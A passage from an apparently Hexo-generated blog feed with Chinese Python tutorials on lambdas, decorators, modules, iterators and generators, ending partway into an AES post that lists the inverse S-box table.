class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 计算两个数的和</span><br>add = <span class="hljs-keyword">lambda</span> x, y: x + y<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>))  <span class="hljs-comment"># 输出: 8</span><br><span class="hljs-comment"># 检查一个数字是否为偶数</span><br>is_even = <span class="hljs-keyword">lambda</span> x: x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(is_even(<span class="hljs-number">4</span>))  <span class="hljs-comment"># 输出: True</span><br><span class="hljs-built_in">print</span>(is_even(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 输出: False</span><br><span class="hljs-comment"># 使用Lambda函数作为map()的函数对象</span><br>numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>squared_numbers = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x * x, numbers)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(squared_numbers))  <span class="hljs-comment"># 输出: [1, 4, 9, 16, 25]</span><br><span class="hljs-comment"># 使用Lambda函数作为filter()的函数对象</span><br>numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>even_numbers = <span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>, numbers)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(even_numbers))  <span class="hljs-comment"># 输出: [2, 4]</span><br></code></pre></td></tr></table></figure><h4 id="Lambda函数的特点"><a href="#Lambda函数的特点" class="headerlink" title="Lambda函数的特点"></a>Lambda函数的特点</h4><ul><li>不能包含代码块，只能包含一个表达式。</li><li>不能有参数列表外的代码。</li><li>不能包含任意复杂的逻辑，因为它们只能包含一个表达式。</li><li>不能有返回语句，因为表达式的结果就是返回值。</li></ul><p>Lambda函数通常用于定义简单的、一次性的函数，或者作为其他函数的参数。它们在处理简单任务时非常有用，但如果需要编写更复杂的函数，应该使用普通的函数定义。</p><h3 id="7-函数装饰器："><a href="#7-函数装饰器：" class="headerlink" title="7.函数装饰器："></a><strong>7.函数装饰器</strong>：</h3><p>函数装饰器（Function Decorator）是Python中一个强大的特性，它允许你在不修改函数代码的情况下，给函数添加额外的功能。<em><strong>装饰器本质上是一个返回函数的高阶函数。</strong></em><br>在Python中，装饰器通常以<code>@</code>符号开头，后面跟着装饰器的名称。当一个函数被一个装饰器装饰时，实际上装饰器返回了一个新的函数，这个新的函数会替换原始函数。</p><h4 id="简单示例："><a href="#简单示例：" class="headerlink" title="简单示例："></a>简单示例：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Something is happening before the function is called.&quot;</span>)<br>        func()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Something is happening after the function is called.&quot;</span>)<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-meta">@my_decorator</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello!&quot;</span>)<br>say_hello()  <span class="hljs-comment"># 输出:</span><br>           <span class="hljs-comment"># Something is happening before the function is called.</span><br>           <span class="hljs-comment"># Hello!</span><br>           <span class="hljs-comment"># Something is happening after the function is called.</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>my_decorator</code>是一个装饰器，它接收一个函数作为参数。<code>wrapper</code>是一个新的函数，它包含原始函数<code>say_hello</code>以及额外的打印语句。当调用<code>say_hello</code>时，实际上调用的是<code>wrapper</code>函数。<br><strong>装饰器可以接收参数</strong>，这样就可以根据不同的情况应用不同的装饰器。</p><h5 id="例如：-1"><a href="#例如：-1" class="headerlink" title="例如："></a>例如：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeat</span>(<span class="hljs-params">num_times</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_times):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Repeating...&quot;</span>)<br>                func(*args, **kwargs)<br>        <span class="hljs-keyword">return</span> wrapper<br>    <span class="hljs-keyword">return</span> decorator<br><span class="hljs-meta">@repeat(<span class="hljs-params"><span class="hljs-number">3</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello!&quot;</span>)<br>say_hello()  <span class="hljs-comment"># 输出:</span><br>           <span class="hljs-comment"># Repeating...</span><br>           <span class="hljs-comment"># Hello!</span><br>           <span class="hljs-comment"># Repeating...</span><br>           <span class="hljs-comment"># Hello!</span><br>           <span class="hljs-comment"># Repeating...</span><br>           <span class="hljs-comment"># Hello!</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>repeat</code>是一个装饰器工厂，它接受一个参数<code>num_times</code>。当<code>repeat(3)</code>被应用到<code>say_hello</code>函数上时，它会创建一个新的装饰器，这个装饰器会重复调用<code>say_hello</code>三次，并在每次调用前后打印重复的提示。</p><p>装饰器在Python中非常常用，它们可以用于<strong>日志记录、性能测试、权限检查</strong>等场景。</p><h3 id="8-模块的定义与使用："><a href="#8-模块的定义与使用：" class="headerlink" title="8.模块的定义与使用："></a><strong>8.模块的定义与使用</strong>：</h3><p>模块（Module）是一个包含Python代码的文件，它用于组织代码、重用代码和隐藏实现细节。模块通常包含函数、类、变量和文档字符串。</p><p>模块的定义与使用主要包括以下几个步骤：</p><ol><li><strong>创建模块</strong>：<br>创建一个包含Python代码的文件，该文件名通常是模块名，扩展名为<code>.py</code>。</li><li><strong>编写模块代码</strong>：<br>在模块文件中，你可以编写函数、类、变量和文档字符串。</li><li><strong>使用模块</strong>：<br>要使用模块，你需要导入它。导入模块有几种方式，包括导入整个模块、导入模块中的特定函数或类、使用 <code>from ... import ...</code> 语法等。<br>下面是一个简单的模块示例，以及如何使用它：<br><strong>模块文件（module.py）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># module.py</span><br><span class="hljs-comment"># 定义一个函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span><br><span class="hljs-comment"># 定义一个类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;My name is <span class="hljs-subst">&#123;self.name&#125;</span> and I am <span class="hljs-subst">&#123;self.age&#125;</span> years old.&quot;</span><br></code></pre></td></tr></table></figure><strong>使用模块的Python文件</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><span class="hljs-comment"># 导入模块</span><br><span class="hljs-keyword">import</span> module<br><span class="hljs-comment"># 使用模块中的函数</span><br><span class="hljs-built_in">print</span>(module.greet(<span class="hljs-string">&quot;Alice&quot;</span>))  <span class="hljs-comment"># 输出: Hello, Alice!</span><br><span class="hljs-comment"># 创建模块中的类实例</span><br>person = module.Person(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">30</span>)<br><span class="hljs-built_in">print</span>(person.introduce())  <span class="hljs-comment"># 输出: My name is Bob and I am 30 years old.</span><br></code></pre></td></tr></table></figure>在这个例子中，<code>module.py</code> 是一个模块文件，其中包含了一个函数 <code>greet</code> 和一个类 <code>Person</code>。在 <code>main.py</code> 文件中，我们使用 <code>import module</code> 语句来导入整个模块。然后，我们使用 <code>module.greet(&quot;Alice&quot;)</code> 来调用模块中的函数，并使用 <code>module.Person(&quot;Bob&quot;, 30)</code> 来创建模块中的类实例。</li></ol><p>模块的使用可以提高代码的可维护性和可读性，因为它们允许将相关的代码组织在一起，并且可以在不同的项目中重用这些代码。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迭代器和生成器</title>
      <link href="/2024/04/27/%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/"/>
      <url>/2024/04/27/%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>应用场景:处理大量数据或需要节省内存</p><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>迭代器是遵循迭代器协议的对象，即它们实现了<code>__iter__()</code>和<code>__next__()</code>两个方法。<code>__iter__()</code>返回迭代器对象本身，<code>__next__()</code>返回序列的下一个元素。如果没有更多元素可返回，则抛出<code>StopIteration</code>异常。</p><h3 id="iter-方法："><a href="#iter-方法：" class="headerlink" title="iter( )方法："></a><code>iter( )</code>方法：</h3><p>在Python中，<code>iter()</code>函数用于获取一个迭代器。它通常与集合数据类型（如列表、元组、字典、集合等）一起使用，以获取这些数据类型的迭代器对象。<br>以下是<code>iter()</code>函数的基本用法：</p><ol><li><p><strong>无参数调用</strong>：<code>iter()</code>可以不带参数调用，这时它会返回一个空的迭代器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">iter</span>()<br></code></pre></td></tr></table></figure></li><li><p><strong>调用具有<code>__iter__()</code>方法的对象</strong>：如果对象实现了<code>__iter__()</code>方法，<code>iter()</code>函数将调用这个方法来获取迭代器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_iter = <span class="hljs-built_in">iter</span>(my_object)<br></code></pre></td></tr></table></figure></li><li><p><strong>调用具有<code>__getitem__()</code>方法的对象</strong>：如果对象实现了<code>__getitem__()</code>方法，<code>iter()</code>函数会创建一个迭代器，尝试按<strong>顺序</strong>获取对象的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_iter = <span class="hljs-built_in">iter</span>(my_object)<br></code></pre></td></tr></table></figure></li><li><p><strong>调用带有两个参数</strong>：<code>iter()</code>也可以接受两个参数，其中第一个参数是函数，第二个参数是哨符(<em>哨符（sentinel）是一个特殊的值，用于在迭代过程中指示何时停止。通常，哨符与<code>iter()</code>函数的第二个参数一起使用，以创建一个迭代器，该迭代器重复调用函数直到它返回哨符值。这种用法允许创建一个基于某些条件停止的迭代器，而不是基于固定数量的元素或项。哨符通常用于文件处理，其中哨符可以是一个特殊的行或字符，指示文件的结束</em>)。这种用法用于创建一个迭代器，该迭代器重复调用函数直到它返回哨符值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_iter = <span class="hljs-built_in">iter</span>(function, sentinel)<br></code></pre></td></tr></table></figure></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h3><p>展示如何使用<code>iter()</code>函数获取列表的迭代器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个列表</span><br><br>my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br><br><span class="hljs-comment"># 使用iter()获取列表的迭代器</span><br><br>my_iter = <span class="hljs-built_in">iter</span>(my_list)<br><br><span class="hljs-comment"># 使用next()获取迭代器的下一个元素</span><br><br>next_element = <span class="hljs-built_in">next</span>(my_iter)<br>next_element<br></code></pre></td></tr></table></figure><p>使用<code>iter()</code>函数获取列表<code>[1, 2, 3, 4, 5]</code>的迭代器后，我们使用<code>next()</code>函数获取迭代器的下一个元素，得到的结果是<code>1</code>。<br>也可以使用<code>next()</code>函数连续调用迭代器来遍历列表中的所有元素。当没有更多元素可返回时，<code>next()</code>函数会抛出<code>StopIteration</code>异常。</p><h3 id="next-方法"><a href="#next-方法" class="headerlink" title="next()方法:"></a><code>next()</code>方法:</h3><p><code>next()</code>函数用于获取迭代器的下一个元素。当你有一个迭代器对象时，你可以使用<code>next()</code>函数来逐个访问其元素，直到没有更多元素可访问，此时<code>next()</code>会抛出<code>StopIteration</code>异常。</p><p>迭代器是一个实现了<code>__next__()</code>方法的对象，该方法返回序列的下一个元素。<code>next()</code>函数简单地调用迭代器的<code>__next__()</code>方法。</p><p>迭代器用于遍历集合，如列表、元组、字典和集合等，而不需要在内存中存储整个集合。这意味着迭代器在处理大数据集时非常高效。</p><h2 id="迭代器示例"><a href="#迭代器示例" class="headerlink" title="迭代器示例"></a>迭代器示例</h2><p>用于创建一个可以生成斐波那契数列的迭代器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FibonacciIterator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.n = n<br>        self.a, self.b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>        self.count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.count &lt; self.n:<br>            value = self.a<br>            self.a, self.b = self.b, self.a + self.b<br>            self.count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> value<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> StopIteration<br><br><span class="hljs-comment"># 使用迭代器生成前10个斐波那契数</span><br>fib_iter = FibonacciIterator(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">list</span>(fib_iter)<br></code></pre></td></tr></table></figure><p>在这个迭代器中：</p><ul><li><code>__init__</code> 方法初始化迭代器，设置要生成的斐波那契数的数量（<code>n</code>），并初始化两个变量 <code>a</code> 和 <code>b</code>，分别代表数列中的前两个数。</li><li><code>__iter__</code> 方法返回迭代器对象本身。</li><li><code>__next__</code> 方法计算下一个斐波那契数，并更新 <code>a</code> 和 <code>b</code> 的值。如果生成的斐波那契数的数量达到了指定的数量（<code>n</code>），则抛出 <code>StopIteration</code> 异常。</li></ul><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>在Python中，生成器是一种特殊类型的迭代器，它使用<code>yield</code>语句来生产一系列的值，用于迭代。生成器的优势在于它提供了<strong>惰性求值（lazy evaluation）</strong>，这意味着它只在需要时生成值，而不是一次性生成所有值。这样做可以节省内存并提高效率。<br>生成器函数的定义与普通函数类似，但有以下特点：</p><ul><li>包含<code>yield</code>关键字。</li><li>当函数被调用时，它返回一个生成器对象，但不会立即执行函数体。</li><li>当生成器对象的<code>__next__()</code>方法被调用时，函数体开始执行，直到遇到<code>yield</code>语句，此时它返回<code>yield</code>后的值并暂停执行。</li></ul><p>下次调用<code>__next__()</code>时，函数从上次暂停的地方继续执行，直到再次遇到<code>yield</code>或函数结束。</p><h3 id="yield关键字"><a href="#yield关键字" class="headerlink" title="yield关键字"></a><code>yield</code>关键字</h3><p>yield <code>VS</code> return</p><ul><li><code>return</code>作为结尾的普通函数直接返回所有结果，程序终止不再运行，并销毁局部变量；</li><li><code>yield</code>会<strong>产生一个断点，暂停函数，挂起函数，保存当前状态</strong>。并且在<code>yield</code>处返回某个值，返回之后程序就不再往下运行了。</li></ul><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun_yield</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;starting fun yield&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = <span class="hljs-keyword">yield</span> <span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;判断yield之后是否继续执行&quot;</span>,res)<br><br>g = fun_yield() <span class="hljs-comment"># 调用这个函数只是会得到一个生成器</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;函数结果是一个生成器：&quot;</span>,g)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;对此生成器还是进行调用：&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第一次调用&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成器的返回值&quot;</span>,<span class="hljs-built_in">next</span>(g))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第二次调用&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成器的返回值&quot;</span>,<span class="hljs-built_in">next</span>(g))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第三次调用&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成器的返回值&quot;</span>,<span class="hljs-built_in">next</span>(g))<br><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../img/%E7%94%9F%E6%88%90%E5%99%A8.png" alt="示例"></p><ul><li><p>程序开始执行以后，因为fun_yield中有yield关键字，所以函数并不会真的执行，而是先得到一个实例化的生成器对象，结果1可以看出不会真的运行。</p></li><li><p>直到调用next()，fun_yield正式开始执行，先执行函数中的print(“starting fun yield”)，然后进入while循环，结果2可以看出</p></li><li><p>程序遇到yield关键字，然后把yield理解为return，return了一个4之后，程序停止，并没有执行后面的print(“判断yield之后是否继续执行”,res)操作，此时next(g)语句执行完成，所以输出的前两行，接下来准备运行第二次调用，结果3可以看出</p></li><li><p>执行下面的print(“生成器的返回值”,next(g))，这个时候和上面那个差不多，不过不同的是，这个时候是从上一次yield停止的断点开始执行，也就是要执行print(“判断yield之后是否继续执行”,res)操作，这时候要注意，这个时候赋值操作的右边是没有值的（因为刚才那个是return出去了，并没有给赋值操作的左边传参数，也就相当于说res里面是没有内容的），所以这个时候res赋值是None，所以接着下面的输出就是None，结果4可以看出</p></li><li><p>之后的程序会继续在while里执行，又一次碰到yield，这个时候同样return出4，结果5可以看出</p></li></ul><h2 id="生成器示例"><a href="#生成器示例" class="headerlink" title="生成器示例"></a>生成器示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibonacci_generator</span>(<span class="hljs-params">n</span>):<br>  <span class="hljs-string">&quot;&quot;&quot;生成斐波那契数列的生成器函数&quot;&quot;&quot;</span><br>  a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>      <span class="hljs-keyword">yield</span> a<br>      a, b = b, a + b<br><br><span class="hljs-comment">#创建一个生成器对象，用于生成前10个斐波那契数</span><br><br>fib_gen = fibonacci_generator(<span class="hljs-number">10</span>)<br><br><span class="hljs-comment">#使用next()获取生成器的下一个元素</span><br><br>fibonacci_sequence = [<span class="hljs-built_in">next</span>(fib_gen) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>fibonacci_sequence<br>[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">21</span>, <span class="hljs-number">34</span>]<br></code></pre></td></tr></table></figure><p>使用生成器函数<code>fibonacci_generator</code>，我们成功地生成了前10个斐波那契数：0, 1, 1, 2, 3, 5, 8, 13, 21, 34。<br>这个示例展示了生成器如何简化生成序列的过程，同时节省内存。由于生成器在迭代时只生成当前需要的值，因此它们在处理大数据集或无限序列时特别有用。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 迭代器和生成器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES 之Sub_Bytes&amp;Mix_Columns（二）</title>
      <link href="/2024/04/24/AES%20%E4%B9%8BSub_Bytes&amp;Mix_Columns%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2024/04/24/AES%20%E4%B9%8BSub_Bytes&amp;Mix_Columns%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Inv-Sub-Bytes（逆字节代换）："><a href="#Inv-Sub-Bytes（逆字节代换）：" class="headerlink" title="Inv_Sub_Bytes（逆字节代换）："></a>Inv_Sub_Bytes（逆字节代换）：</h2><p>Inv_Sub_Bytes是AES算法中的一个步骤，它是Sub_Bytes的逆过程，用于解密过程中对数据进行逆变换。在AES算法中，Inv_Sub_Bytes操作对状态的每个字节使用逆S-Box的进行替换。<br>AES的S-Box是一个16x16的查找表，用于在加密过程中将每个字节映射到另一个字节。Inv_Sub_Bytes使用的是S-Box的逆查找表，即Inv_S盒，用于在解密过程中将每个字节映射回原始字节。</p><h5 id="Inv-S盒："><a href="#Inv-S盒：" class="headerlink" title="Inv_S盒："></a>Inv_S盒：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">inv_sbox = [<br>    [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>],<br>    [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>],<br>    [<span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>],<br>    [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>],<br>    [<span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>],<br>    [<span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>],<br>    [<span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span 